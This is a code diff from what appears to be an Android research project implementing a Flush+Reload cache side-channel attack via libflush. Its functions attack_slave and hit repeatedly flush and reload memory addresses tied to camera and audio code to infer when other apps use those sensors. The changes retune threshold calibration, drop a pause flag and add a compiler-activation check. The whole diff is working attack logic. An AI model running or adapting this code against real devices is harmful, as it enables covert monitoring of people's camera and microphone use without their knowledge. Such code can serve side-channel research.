@@ -43,9 +43,9 @@ static int shared_data_shm_fd = 0;
 
 #define LENGTH(x) (sizeof(x)/sizeof((x)[0]))
 /* Forward declarations */
-static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
+void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
                          int threshold, int* flags, long* times, int* thresholds, int* logs, int log_length,int sum_length,
-                         int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr,int* pausescan);
+                         int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr);
 /*
 #define TAG_NAME "libflush"
 #define log_err(fmt,args...) __android_log_print(ANDROID_LOG_ERROR, TAG_NAME, (const char *) fmt, ##args)
@@ -100,10 +100,14 @@ void stage1_(int* arr,size_t threshold, int* length_of_camera_audio, size_t* add
                     }
                 }
             }
-            else{//j==0 3
+            else if(addr[j]!=0){//j==0 3
                 count = libflush_reload_address_and_flush(libflush_session, addr[j]);
                 if(count<=threshold&&j<4){
                     LOGD("Target %d-%d-%p.",j,count,addr[j]);
+                    //length = sum_length;
+                }
+                if(count<=threshold&&j==4){
+                    LOGD("Compiler activated",j,count,addr[j]);
                     length = sum_length;
                 }
             }
@@ -213,7 +217,7 @@ adjust_threshold(int threshold, int* length_of_camera_audio, size_t* addr, int* 
         size_t n = 0;
         size_t count;
         int threshold_pre = threshold;
-        for(int j=0;j<50;j++) {
+        for(int j=0;j<1000;j++) {
             for (int i = 0; i < length_of_camera_audio[0]; i++) {
                 size_t target = *((size_t *) addr[1] + i);
                 if (target == 0) {//if the target is 0, skip it.
@@ -237,18 +241,18 @@ adjust_threshold(int threshold, int* length_of_camera_audio, size_t* addr, int* 
                 }
             }
         }
-        if(n>t/5||f==0){//if there is a big gap between two threshold
+        if(n>t/2||f==0){//if there is a big gap between two threshold
             f=1;
             t = n;
-            threshold -= 10;
-            LOGD("Threshold decrease 10 to %d",threshold);
+            threshold -= 20;
+            LOGD("Threshold decrease to %d",threshold);
             if(threshold<0) {//if the caliberation went wrong, use the original threshold.
                 libflush_terminate(libflush_session);
                 return threshold_pre;
             }
             continue;
         }
-        threshold += 10;
+        threshold += 20;
         break;
     }
     LOGD("Finish adjusting threshold with %d.\n",threshold);
@@ -258,9 +262,10 @@ adjust_threshold(int threshold, int* length_of_camera_audio, size_t* addr, int* 
 
 int hit(pthread_mutex_t *g_lock, int compiler_position, int *continueRun,
         int threshold, int* flags, long* times, int* thresholds, int* logs, int log_length, int sum_length,
-        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr, int* pausescan)
+        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr)
 {
     LOGD("Start.\n");
+
     for(int j=0;j<sum_length;j++) {
         if (j == 1 || j == 2) {
             int c = j-1;
@@ -271,6 +276,7 @@ int hit(pthread_mutex_t *g_lock, int compiler_position, int *continueRun,
         }
         LOGD("address:%p", addr[j]);
     }
+
     /* Initialize libflush */
     libflush_session_t* libflush_session;
     libflush_init(&libflush_session, NULL);
@@ -278,8 +284,8 @@ int hit(pthread_mutex_t *g_lock, int compiler_position, int *continueRun,
     LOGD("[x] Threshold: %zu\n", threshold);
     /* Start slaves */
     attack_slave(libflush_session, g_lock, compiler_position, continueRun,
-    threshold, flags, times, thresholds, logs, log_length,sum_length,
-    camera_pattern, audio_pattern, length_of_camera_audio, addr,pausescan);
+        threshold, flags, times, thresholds, logs, log_length,sum_length,
+        camera_pattern, audio_pattern, length_of_camera_audio, addr);
     /* Terminate libflush */
     libflush_terminate(libflush_session);
     return 0;
@@ -317,12 +323,11 @@ void flush_address(size_t* address,int length){
     libflush_terminate(libflush_session);
 }
 
-static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
+//when use static, the location function keeps poping
+void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *g_lock, int compiler_position,int *continueRun,
         int threshold, int* flags, long* times, int* thresholds, int* logs, int log_length,int sum_length,
-        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr, int* pausescan)
-{
+        int* camera_pattern, int* audio_pattern, int *length_of_camera_audio, size_t* addr){
     struct timeval tv;//for quering time stamp
-    int repetitive_hit = 0;//we use the papram to determine whether we should shrink list.
     //gettimeofday(&tv,NULL);
     libflush_init(&libflush_session, NULL);
     /* Run Flush and reload */
@@ -332,19 +337,16 @@ static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *
     LOGD("[x] start scaning %d",compiler_position);
     while(*continueRun){
       // if the turns reached 10000 or the same offset was hit more than many times repetitively, shrink the list;
-        while(*pausescan==1){
-            usleep(50);
-        }
         if(turns>=100000){
 	        LOGD("Turns %d",turns);
             length = compiler_position;
 	        turns = 0;
         }
         //Traverse all addresses
-        for(int crt_ofs=0; crt_ofs<length; crt_ofs=crt_ofs+1){
+        for(int crt_ofs=0; crt_ofs<length; crt_ofs++){
             if(addr[crt_ofs]==0)
                 continue;
-            int count;
+            size_t count;
             if(crt_ofs==1||crt_ofs==2){
                 int c = crt_ofs-1;
                 pthread_mutex_lock(g_lock);
@@ -397,7 +399,7 @@ static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *
                 pthread_mutex_lock(g_lock);
                 if (crt_ofs < compiler_position-1) {
                     flags[crt_ofs] += 1;//here I have got all functions' activation
-                    LOGD("cache hit %d %d %p", crt_ofs, count,addr[crt_ofs]);
+                    LOGD("cache hit %d %d %p", crt_ofs, count, addr[crt_ofs]);
                 }
                 if (log_length >= 290000) {
                     LOGD("Log Length is larger than 300000, set to 0.");
